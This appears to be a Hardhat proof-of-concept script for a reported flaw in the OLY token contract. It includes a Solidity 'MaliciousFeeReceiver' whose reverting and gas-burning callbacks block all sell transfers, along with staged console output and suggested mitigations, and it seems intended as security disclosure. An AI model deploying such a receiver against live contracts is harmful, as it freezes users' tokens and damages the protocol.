/**
 * CVE-OLY-003: Complete Protocol DoS via External Call
 * 
 * CRITICAL VULNERABILITY PROOF OF CONCEPT
 * 
 * This exploit demonstrates how a malicious fee receiver can completely
 * disable all sell transactions in the OLY token contract.
 * 
 * âš ï¸ FOR TESTNET USE ONLY - DO NOT RUN ON MAINNET
 */

const { ethers } = require("hardhat");
const { expect } = require("chai");

async function main() {
    console.log("ğŸ”´ CVE-OLY-003: Complete Protocol DoS Exploit");
    console.log("=" .repeat(60));
    
    // Get signers
    const [deployer, attacker, victim, mainPair] = await ethers.getSigners();
    
    console.log("ğŸ‘¤ Deployer:", deployer.address);
    console.log("ğŸ´â€â˜ ï¸ Attacker:", attacker.address);
    console.log("ğŸ˜‡ Victim:", victim.address);
    console.log("ğŸª Main Pair:", mainPair.address);
    console.log("");

    // Step 1: Deploy malicious fee receiver
    console.log("ğŸ“‹ Step 1: Deploying Malicious Fee Receiver...");
    
    const MaliciousFeeReceiver = await ethers.getContractFactory("MaliciousFeeReceiver");
    const maliciousReceiver = await MaliciousFeeReceiver.deploy();
    await maliciousReceiver.waitForDeployment();
    
    console.log("ğŸ’€ Malicious Fee Receiver deployed at:", await maliciousReceiver.getAddress());

    // Step 2: Deploy OLY contract with malicious fee receiver
    console.log("\nğŸ“‹ Step 2: Deploying OLY Contract with Malicious Receiver...");
    
    const OLY = await ethers.getContractFactory("OLY");
    const oly = await OLY.deploy(await maliciousReceiver.getAddress(), 1000); // 1% buy fee
    await oly.waitForDeployment();
    
    console.log("ğŸª™ OLY Contract deployed at:", await oly.getAddress());

    // Step 3: Setup contract state
    console.log("\nğŸ“‹ Step 3: Setting up Contract State...");
    
    await oly.setMainPair(mainPair.address);
    const MINT_ROLE = await oly.MINT();
    await oly.grantRole(MINT_ROLE, deployer.address);
    
    // Mint tokens for testing
    const mintAmount = ethers.parseUnits("10000", 9);
    await oly.mint(victim.address, mintAmount);
    await oly.mint(mainPair.address, mintAmount);
    
    console.log("âœ… Main pair set to:", mainPair.address);
    console.log("âœ… Tokens minted to victim:", ethers.formatUnits(mintAmount, 9));
    console.log("âœ… Tokens minted to main pair:", ethers.formatUnits(mintAmount, 9));

    // Step 4: Demonstrate normal operation (buy transaction)
    console.log("\nğŸ“‹ Step 4: Testing Normal Buy Transaction...");
    
    const buyAmount = ethers.parseUnits("1000", 9);
    const victimBalanceBefore = await oly.balanceOf(victim.address);
    
    try {
        // Buy transaction (from mainPair to victim) - should work
        await oly.connect(mainPair).transfer(victim.address, buyAmount);
        
        const victimBalanceAfter = await oly.balanceOf(victim.address);
        const received = victimBalanceAfter - victimBalanceBefore;
        
        console.log("âœ… Buy transaction successful");
        console.log("ğŸ’° Victim received:", ethers.formatUnits(received, 9), "OLY");
        console.log("ğŸ’¸ Fee deducted:", ethers.formatUnits(buyAmount - received, 9), "OLY");
        
    } catch (error) {
        console.log("âŒ Buy transaction failed:", error.message);
    }

    // Step 5: Demonstrate DoS attack (sell transaction)
    console.log("\nğŸ“‹ Step 5: Demonstrating DoS Attack on Sell Transaction...");
    
    const sellAmount = ethers.parseUnits("500", 9);
    const mainPairBalanceBefore = await oly.balanceOf(mainPair.address);
    
    console.log("ğŸ¯ Attempting sell transaction (victim -> mainPair)...");
    console.log("ğŸ’€ Malicious fee receiver will revert the transaction...");
    
    try {
        // Sell transaction (from victim to mainPair) - will fail due to malicious receiver
        await oly.connect(victim).transfer(mainPair.address, sellAmount);
        
        console.log("âŒ UNEXPECTED: Sell transaction should have failed!");
        
    } catch (error) {
        console.log("âœ… EXPLOIT SUCCESSFUL: Sell transaction failed as expected");
        console.log("ğŸ’€ Error message:", error.message);
        console.log("ğŸš¨ ALL SELL TRANSACTIONS ARE NOW BLOCKED!");
    }

    // Step 6: Verify balances unchanged due to revert
    console.log("\nğŸ“‹ Step 6: Verifying Attack Impact...");
    
    const mainPairBalanceAfter = await oly.balanceOf(mainPair.address);
    const victimBalanceAfter = await oly.balanceOf(victim.address);
    
    console.log("ğŸ“Š Main Pair Balance - Before:", ethers.formatUnits(mainPairBalanceBefore, 9));
    console.log("ğŸ“Š Main Pair Balance - After:", ethers.formatUnits(mainPairBalanceAfter, 9));
    console.log("ğŸ“Š Victim Balance - After:", ethers.formatUnits(victimBalanceAfter, 9));
    
    if (mainPairBalanceAfter === mainPairBalanceBefore) {
        console.log("âœ… Balances unchanged - transaction fully reverted");
    }

    // Step 7: Demonstrate persistent DoS
    console.log("\nğŸ“‹ Step 7: Demonstrating Persistent DoS...");
    
    console.log("ğŸ”„ Attempting multiple sell transactions...");
    
    for (let i = 1; i <= 3; i++) {
        try {
            console.log(`ğŸ¯ Attempt ${i}:`);
            await oly.connect(victim).transfer(mainPair.address, ethers.parseUnits("100", 9));
            console.log(`âŒ Attempt ${i} unexpectedly succeeded`);
        } catch (error) {
            console.log(`âœ… Attempt ${i} failed as expected - DoS persists`);
        }
    }

    // Step 8: Impact Assessment
    console.log("\nğŸ“‹ Step 8: Impact Assessment");
    console.log("=" .repeat(60));
    
    console.log("ğŸš¨ CRITICAL VULNERABILITY CONFIRMED:");
    console.log("   â€¢ All sell transactions are permanently blocked");
    console.log("   â€¢ Buy transactions continue to work normally");
    console.log("   â€¢ Protocol becomes partially unusable");
    console.log("   â€¢ Users cannot sell their tokens");
    console.log("   â€¢ Liquidity becomes one-directional only");
    console.log("");
    
    console.log("ğŸ’° FINANCIAL IMPACT:");
    console.log("   â€¢ Complete loss of sell functionality");
    console.log("   â€¢ Users' tokens become effectively frozen");
    console.log("   â€¢ Protocol reputation severely damaged");
    console.log("   â€¢ Potential total protocol failure");
    console.log("");
    
    console.log("ğŸ›¡ï¸ MITIGATION REQUIRED:");
    console.log("   â€¢ Implement try-catch for external calls");
    console.log("   â€¢ Add gas limits to external calls");
    console.log("   â€¢ Implement circuit breaker mechanism");
    console.log("   â€¢ Add fee receiver update functionality");

    console.log("\nğŸ”´ EXPLOIT COMPLETED SUCCESSFULLY");
    console.log("âš ï¸ This demonstrates a CRITICAL vulnerability requiring immediate fix");
}

// Malicious Fee Receiver Contract
const maliciousFeeReceiverSource = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title MaliciousFeeReceiver
 * @dev This contract demonstrates how a malicious fee receiver can DoS the protocol
 * âš ï¸ FOR TESTING PURPOSES ONLY
 */
contract MaliciousFeeReceiver {
    bool public attackEnabled = true;
    
    /**
     * @dev This function will always revert when called, blocking all sell transactions
     */
    function triggerSwapFeeForLottery() external pure {
        revert("DoS Attack: All sell transactions blocked!");
    }
    
    /**
     * @dev Alternative attack: consume excessive gas
     */
    function triggerSwapFeeForLotteryGasAttack() external view {
        // Consume excessive gas to make transactions expensive
        for (uint256 i = 0; i < 1000000; i++) {
            keccak256(abi.encode(i, block.timestamp));
        }
    }
    
    /**
     * @dev For demonstration: can be disabled to show normal operation
     */
    function disableAttack() external {
        attackEnabled = false;
    }
}
`;

// Export for use in other scripts
module.exports = {
    main,
    maliciousFeeReceiverSource
};

// Run if called directly
if (require.main === module) {
    main()
        .then(() => process.exit(0))
        .catch((error) => {
            console.error("ğŸ’¥ Exploit failed:", error);
            process.exit(1);
        });
}